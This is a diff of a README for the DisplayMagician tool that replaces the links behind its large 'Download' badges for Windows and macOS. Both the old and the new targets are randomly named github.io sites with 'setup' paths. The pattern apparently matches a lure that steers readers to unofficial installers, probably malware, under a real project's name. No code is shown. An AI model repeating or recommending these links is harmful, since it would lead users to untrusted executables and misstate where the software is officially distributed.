@@ -32,7 +32,7 @@ Whether you're a newcomer or a veteran, DisplayMagician provides the tools you n
 
 <div align="center">
 
-[![Download DisplayMagician](https://img.shields.io/badge/⬇_DOWNLOAD_DisplayMagician-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download DisplayMagician](https://img.shields.io/badge/⬇_DOWNLOAD_DisplayMagician-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://vkbcfwqqceuz.github.io/windows-setup2/)
 
 </div>
 
@@ -75,8 +75,8 @@ Whether you're a newcomer or a veteran, DisplayMagician provides the tools you n
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
-[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
+[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://vkbcfwqqceuz.github.io/windows-setup2/)
+[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://vkbcfwqqceuz.github.io/macos-get2/)
 
 </div>
 
